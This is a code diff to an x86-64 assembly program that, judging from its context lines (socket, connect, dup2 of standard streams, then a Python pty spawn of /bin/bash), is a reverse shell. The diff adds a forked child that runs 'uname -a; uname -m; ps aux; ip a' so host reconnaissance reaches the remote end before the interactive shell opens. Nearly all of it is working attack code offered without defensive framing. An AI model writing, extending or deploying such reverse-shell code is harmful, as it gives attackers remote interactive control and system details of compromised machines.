@@ -15,6 +15,10 @@ sh_cmd db "/usr/bin/python3", 0
 arg1 db "-c", 0
 arg2 db "import pty; pty.spawn('/bin/bash')", 0
 
+info_cmd db "/bin/sh", 0
+info_arg1 db "-c", 0
+info_arg2 db "uname -a; uname -m; ps aux; ip a", 0
+
 err_socket db "[-] Socket creation failed", 10, 0
 err_connect db "[-] Connection failed", 10, 0
 err_dup2 db "[-] dup2 failed", 10, 0
@@ -76,6 +80,21 @@ dup_stderr:
         test rax, rax
         js error_dup2
 
+system_info:
+        ; Fork a process
+        mov rax, 57                             ; syscall: fork
+        syscall
+        test rax, rax
+        jnz init_shell                          ; If parent, continue to shell
+
+        ; Child process executes system info command
+        mov rax, 59                             ; syscall: execve
+        mov rdi, info_cmd                       ; path: /bin/sh
+        lea rsi, [rel info_args]                ; argv = {"/bin/sh", "-c", "uname -a; uname -m; ps aux; ip a", NULL}
+        xor rdx, rdx                            ; envp = NULL
+        syscall
+        jmp exit                                ; If exec fails, exit child
+
 init_shell:
         ; Execute Python3 to spawn a fully interactive Bash shell
         mov rax, 59                             ; syscall: execve
@@ -90,6 +109,12 @@ args:
         dq sh_cmd
         dq arg1
         dq arg2
+        dq 0
+
+info_args:
+        dq info_cmd
+        dq info_arg1
+        dq info_arg2
         dq 0
 
 ; ------------------------------------------
@@ -128,4 +153,3 @@ exit:
         mov rax, 60                             ; syscall: exit
         xor rdi, rdi                            ; exit(0)
         syscall
-
